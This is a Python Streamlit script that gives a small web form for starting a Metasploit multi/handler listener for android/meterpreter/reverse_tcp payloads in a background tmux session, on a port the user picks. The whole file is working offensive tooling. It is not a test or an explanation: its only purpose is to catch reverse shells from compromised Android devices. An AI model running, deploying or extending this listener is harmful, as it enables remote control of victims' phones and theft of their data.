import streamlit as st
import subprocess

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return True, result.stdout.strip()
        else:
            return False, result.stderr.strip()
    except Exception as e:
        return False, str(e)

def start_listener(port_number):
    handler_command = f'use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport {port_number}; exploit -j'
    success, message = execute_command(f'tmux new-session -d -s handler-{port_number} \'msfconsole -x "{handler_command}"\' ')
    if success:
        return f"Listener started successfully on port {port_number}"
    else:
        return message

def main():
    st.title("Start Metasploit Listener")
    port_number = st.number_input("Enter port number:", min_value=1, max_value=65535, value=8080, step=1)

    if st.button("Start Listener"):
        message = start_listener(port_number)
        if message.startswith("Listener started successfully"):
            st.success(message)
        else:
            st.error(message)

if __name__ == "__main__":
    main()
